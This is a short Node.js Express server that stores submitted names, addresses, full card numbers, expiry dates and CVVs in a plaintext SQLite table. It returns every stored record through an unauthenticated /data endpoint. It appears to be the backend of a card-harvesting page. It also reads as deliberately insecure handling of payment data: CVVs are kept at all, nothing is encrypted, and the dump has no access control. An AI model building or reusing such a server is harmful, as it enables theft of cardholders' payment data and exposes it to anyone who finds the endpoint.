const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');
const dotenv = require('dotenv');

// Load environment variables from a .env file into process.env
dotenv.config();

const app = express();
const port = process.env.PORT || 3000; // استخدام المنفذ من المتغيرات البيئية أو 3000 كافتراضي

// Middleware for parsing JSON and URL-encoded data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Database connection
let db = new sqlite3.Database(process.env.DB_NAME || 'users.db', (err) => {
    if (err) {
        console.error(err.message);
    }
    console.log('Connected to the SQLite database.');
});

// Create a table to store user data if it doesn't exist
db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    streetName TEXT,
    province TEXT,
    cardNumber TEXT,
    expiryDate TEXT,
    cvv TEXT
)`);

// Endpoint for submitting data
app.post('/submit-data', (req, res) => {
    const { name, streetName, province, cardNumber, expiryDate, cvv } = req.body;
    db.run(`INSERT INTO users (name, streetName, province, cardNumber, expiryDate, cvv) VALUES (?, ?, ?, ?, ?, ?)`, 
    [name, streetName, province, cardNumber, expiryDate, cvv], (err) => {
        if (err) {
            console.error(err.message);
            res.status(500).send('Error saving data.');
        } else {
            res.status(200).send('Data saved successfully.');
        }
    });
});

// Endpoint for fetching data
app.get('/data', (req, res) => {
    db.all(`SELECT * FROM users`, [], (err, rows) => {
        if (err) {
            console.error(err.message);
            res.status(500).send('Error fetching data.');
        } else {
            res.status(200).json(rows);
        }
    });
});

// Serve index.html for the root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
